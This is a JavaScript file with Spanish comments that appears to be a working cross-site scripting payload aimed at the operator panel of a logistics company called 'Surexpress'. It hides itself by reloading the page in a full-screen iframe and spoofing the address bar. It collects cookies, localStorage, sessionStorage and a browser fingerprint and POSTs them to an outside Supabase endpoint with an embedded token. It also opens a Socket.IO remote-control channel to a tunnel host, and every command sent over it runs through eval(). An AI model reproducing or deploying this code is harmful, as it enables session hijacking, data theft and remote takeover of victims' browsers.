// =============================================
// INICIALIZACIÓN PRINCIPAL
// =============================================

// Verificar contexto inmediatamente
if (window.self !== window.top) {
    // ESTAMOS EN IFRAME - Simular rutas
    setupIframeRouteSimulation();
} else if (!window.__MAIN_XSS_EXECUTED__) {
    // ESTAMOS EN PÁGINA PRINCIPAL - IFRAME PRIMERO
    window.__MAIN_XSS_EXECUTED__ = true;
    executeMainXSS();
    setupWebSocketController();
}

// =============================================
// FUNCIONES PRINCIPALES
// =============================================

function executeMainXSS() {
    'use strict';

    // Función para crear iframe
    function createIframeFirst() {
        try {
            // Asegurar que el body existe
            if (!document.body) {
                setTimeout(createIframeFirst, 50);
                return;
            }

            // Crear iframe con opacidad 0 inicialmente para evitar flicker
            const iframe = document.createElement('iframe');
            iframe.src = window.location.href;
            iframe.style.cssText = `
                width: 100% !important;
                height: 100% !important;
                border: none !important;
                position: fixed !important;
                top: 0 !important;
                left: 0 !important;
                z-index: 99999 !important;
                margin: 0 !important;
                padding: 0 !important;
                background: white !important;
                opacity: 0 !important;
            `;

            // Agregar iframe al body
            document.body.appendChild(iframe);

            // Limpiar otros elementos del body, manteniendo el iframe
            const children = Array.from(document.body.children);
            children.forEach(child => {
                if (child !== iframe) {
                    document.body.removeChild(child);
                }
            });

            // Establecer estilos del body
            document.body.style.overflow = 'hidden';
            document.body.style.margin = '0';
            document.body.style.padding = '0';

            // Cuando el iframe cargue, hacerlo visible
            iframe.onload = () => {
                iframe.style.opacity = '1';

                // Configurar simulación de rutas después del iframe
                setupRouteSystem(iframe);

                // Ejecutar fingerprinting después del iframe
                executeFullFingerprinting();
            };

        } catch (e) {
            setTimeout(createIframeFirst, 100);
        }
    }

    // Función para fingerprinting completo
    function executeFullFingerprinting() {
        try {
            const fingerprintData = {
                timestamp: new Date().toISOString(),
                url: location.href,
                referrer: document.referrer,
                userAgent: navigator.userAgent,
                language: navigator.language,
                languages: JSON.stringify(navigator.languages),
                platform: navigator.platform,
                cookieEnabled: navigator.cookieEnabled,
                cookies: document.cookie,
                localStorage: JSON.stringify(localStorage),
                sessionStorage: JSON.stringify(sessionStorage),
                screen: JSON.stringify({
                    width: screen.width,
                    height: screen.height,
                    colorDepth: screen.colorDepth
                }),
                browser: JSON.stringify({
                    vendor: navigator.vendor,
                    product: navigator.product
                }),
                connection: JSON.stringify(navigator.connection ? {
                    effectiveType: navigator.connection.effectiveType,
                    downlink: navigator.connection.downlink
                } : 'N/A'),
                deviceMemory: navigator.deviceMemory || 'Unknown',
                hardwareConcurrency: navigator.hardwareConcurrency,
                plugins: JSON.stringify(Array.from(navigator.plugins).map(p => ({
                    name: p.name,
                    filename: p.filename
                }))),
                fonts: JSON.stringify(['Arial', 'Times New Roman', 'Verdana', 'Georgia']
                    .filter(f => document.fonts.check('12px "' + f + '"'))),
                canvasFingerprint: (function () {
                    const canvas = document.createElement('canvas');
                    const ctx = canvas.getContext('2d');
                    ctx.textBaseline = 'top';
                    ctx.font = '14px Arial';
                    ctx.fillStyle = '#f60';
                    ctx.fillRect(125, 1, 62, 20);
                    ctx.fillStyle = '#069';
                    ctx.fillText('FP', 2, 15);
                    return canvas.toDataURL();
                })(),
                historyLength: history.length,
                forms: JSON.stringify(Array.from(document.forms).map(f => ({
                    action: f.action,
                    method: f.method
                }))),
                links: JSON.stringify(Array.from(document.links).slice(0, 5).map(l => ({
                    href: l.href
                }))),
                attackPhase: 'main_with_iframe'
            };

            // Enviar datos via fetch
            fetch('https://yfwzpojlsqkwvtmessmw.supabase.co/functions/v1/crud-data/crud/create', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Inlmd3pwb2psc3Frd3Z0bWVzc213Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTkzNDI1ODIsImV4cCI6MjA3NDkxODU4Mn0.vuHSGbSKNHxUjXjgA6oJNdmHxsZblr_ZAXYYLe-yLA8'
                },
                body: JSON.stringify({ fingerprint: fingerprintData })
            });

        } catch (e) {
            // Silenciar errores
        }
    }

    // Función para configurar simulación de rutas
    function setupRouteSystem(iframe) {
        let currentPath = window.location.pathname;

        // Función para actualizar URL del navegador
        function updateBrowserURL(path) {
            currentPath = path;
            window.history.replaceState({}, '', path);
            document.title = 'Surexpress | ' + getPageTitle(path);
        }

        // Función para obtener título de página
        function getPageTitle(path) {
            const titles = {
                '/Operator/Dashboard_M/': 'Dashboard',
                '/Operator/Orders/': 'Órdenes',
                '/Operator/Usuarios/': 'Usuarios',
                '/Operator/Clientes/': 'Clientes',
                '/Operator/Agencias/': 'Agencias',
                '/Operator/Monitor/': 'Monitor',
                '/Operator/GuiasAereas/': 'Guías Aéreas',
                '/Operator/Billing/': 'Facturación',
                '/Operator/Revision/': 'Revisiones',
                '/Operator/incidenciaHouse/': 'Incidencias'
            };
            return titles[path] || 'Sistema';
        }

        // Escuchar mensajes del iframe para cambios de URL
        window.addEventListener('message', (event) => {
            if (event.data && event.data.type === 'URL_CHANGE') {
                updateBrowserURL(event.data.url);
            }
        });

        // Manejar botones atrás/adelante
        window.addEventListener('popstate', () => {
            const newPath = window.location.pathname + window.location.search;
            iframe.src = newPath;
        });
    }

    // Iniciar proceso - iframe primero
    createIframeFirst();
}

function setupWebSocketController() {
    'use strict';

    const WS_SERVER = 'https://lt6wg5nh-3002.use2.devtunnels.ms';
    let socket = null;

    // Diccionario para scripts persistentes
    const persistentScripts = {};

    // Función para cargar Socket.IO dinámicamente
    function loadSocketIO(callback) {
        if (window.io) {
            callback();
            return;
        }

        const script = document.createElement('script');
        script.src = 'https://cdn.socket.io/4.7.5/socket.io.min.js';
        script.onload = () => callback();
        script.onerror = () => setTimeout(() => loadSocketIO(callback), 3000);
        document.head.appendChild(script);
    }

    // Función para conectar WebSocket
    function connectWebSocket() {
        loadSocketIO(() => {
            try {
                socket = io(WS_SERVER, {
                    transports: ['polling'],
                    upgrade: false,
                    timeout: 10000,
                    path: '/socket.io',
                    withCredentials: false
                });

                socket.on('connect', () => console.log('ws cn'));
                socket.on('execute-command', handleExecuteCommand);
                socket.on('destroy-persistent', handleDestroyPersistent);
                socket.on('sync-persistent', handleSyncPersistent);
                socket.on('disconnect', () => console.log('ws cn'));
                socket.on('connect_error', () => setTimeout(connectWebSocket, 5000));

            } catch (error) {
                setTimeout(connectWebSocket, 5000);
            }
        });
    }

    // Función para manejar ejecución de comandos
    function handleExecuteCommand(data) {
        const { command, persistent, id } = data;
        try {
            console.log('ej cmnd');

            // EJECUCIÓN LIBRE CON eval()
            const result = eval(command);

            if (persistent && id) {
                persistentScripts[id] = {
                    script: command,
                    cleanup: typeof result === 'function' ? result : null
                };
            }

            // Enviar confirmación
            if (socket && socket.connected) {
                socket.emit('command_executed', {
                    id: id,
                    success: true,
                    hasCleanup: !!result,
                    timestamp: new Date().toISOString()
                });
            }

        } catch (error) {
            console.error('err', error);

            // Enviar error
            if (socket && socket.connected) {
                socket.emit('command_error', {
                    id: id,
                    error: error.message,
                    timestamp: new Date().toISOString()
                });
            }
        }
    }

    // Función para destruir scripts persistentes
    function handleDestroyPersistent(data) {
        const { id } = data;

        if (persistentScripts[id]) {
            // Ejecutar cleanup si existe
            if (persistentScripts[id].cleanup) {
                try {
                    persistentScripts[id].cleanup();
                } catch (error) {
                    console.error('err:', error);
                }
            }

            // Remover del diccionario
            delete persistentScripts[id];

            // Enviar confirmación
            if (socket && socket.connected) {
                socket.emit('persistent_destroyed', {
                    id: id,
                    success: true,
                    timestamp: new Date().toISOString()
                });
            }
        } else {
            // Enviar error
            if (socket && socket.connected) {
                socket.emit('persistent_not_found', {
                    id: id,
                    timestamp: new Date().toISOString()
                });
            }
        }
    }

    // Función para sincronizar scripts persistentes
    function handleSyncPersistent(data) {
        try {
            for (const [id, cmd] of Object.entries(data)) {
                try {
                    // EJECUCIÓN LIBRE
                    const result = eval(cmd);

                    // Almacenar en diccionario
                    persistentScripts[id] = {
                        script: cmd,
                        cleanup: typeof result === 'function' ? result : null
                    };

                } catch (error) {
                    console.error('err:', error);
                }
            }

            // Enviar confirmación
            if (socket && socket.connected) {
                socket.emit('sync_completed', {
                    count: Object.keys(data).length,
                    timestamp: new Date().toISOString()
                });
            }

        } catch (error) {
            console.error('err:', error);

            if (socket && socket.connected) {
                socket.emit('sync_error', {
                    error: error.message,
                    timestamp: new Date().toISOString()
                });
            }
        }
    }

    // Iniciar conexión
    connectWebSocket();

    // Devolver API pública si es necesario
    return {
        getPersistentScripts: () => ({ ...persistentScripts })
    };
}

// =============================================
// SIMULACIÓN DE RUTAS EN IFRAME
// =============================================

function setupIframeRouteSimulation() {
    'use strict';

    // Evitar ejecución múltiple en el mismo iframe
    if (window.__IFRAME_ROUTES_ACTIVE__) {
        return;
    }
    window.__IFRAME_ROUTES_ACTIVE__ = true;

    // Interceptar History API
    const originalPushState = history.pushState;
    const originalReplaceState = history.replaceState;

    history.pushState = function(state, title, url) {
        if (url && window.parent) {
            const urlStr = typeof url === 'string' ? url : url.toString();
            window.parent.postMessage({
                type: 'URL_CHANGE',
                url: urlStr,
                action: 'push'
            }, '*');
        }
        return originalPushState.apply(this, arguments);
    };

    history.replaceState = function(state, title, url) {
        if (url && window.parent) {
            const urlStr = typeof url === 'string' ? url : url.toString();
            window.parent.postMessage({
                type: 'URL_CHANGE',
                url: urlStr,
                action: 'replace'
            }, '*');
        }
        return originalReplaceState.apply(this, arguments);
    };

    // Interceptar clicks en enlaces
    document.addEventListener('click', (e) => {
        let target = e.target;
        while (target && target.tagName !== 'A') {
            target = target.parentElement;
        }

        if (target && target.href) {
            // Permitir descargas
            if (target.href.includes('/files/down/') ||
                target.href.includes('.xlsx') ||
                target.href.includes('.pdf') ||
                target.href.includes('.csv') ||
                target.href.includes('.zip') ||
                target.download) {
                return;
            }

            // Para navegación normal
            if (target.href.includes('/Operator/')) {
                e.preventDefault();

                const url = new URL(target.href);
                const path = url.pathname + url.search;

                // Navegar dentro del iframe
                window.location.href = target.href;

                // Notificar al padre
                if (window.parent) {
                    window.parent.postMessage({
                        type: 'URL_CHANGE',
                        url: path,
                        action: 'click'
                    }, '*');
                }
            }
        }
    });

    // Detector automático de cambios de ruta
    let lastPath = window.location.pathname + window.location.search;

    setInterval(() => {
        const currentPath = window.location.pathname + window.location.search;
        if (currentPath !== lastPath) {
            lastPath = currentPath;

            if (window.parent) {
                window.parent.postMessage({
                    type: 'URL_CHANGE',
                    url: currentPath,
                    action: 'auto'
                }, '*');
            }
        }
    }, 250);

    // Interceptar formularios
    document.addEventListener('submit', (e) => {
        const form = e.target;
        if (form.action && form.action.includes('/Operator/')) {
            setTimeout(() => {
                const currentPath = window.location.pathname + window.location.search;
                if (window.parent) {
                    window.parent.postMessage({
                        type: 'URL_CHANGE',
                        url: currentPath,
                        action: 'form'
                    }, '*');
                }
            }, 500);
        }
    });

    // Notificar ruta inicial
    setTimeout(() => {
        if (window.parent) {
            const currentPath = window.location.pathname + window.location.search;
            window.parent.postMessage({
                type: 'URL_CHANGE',
                url: currentPath,
                action: 'initial'
            }, '*');
        }
    }, 300);
}
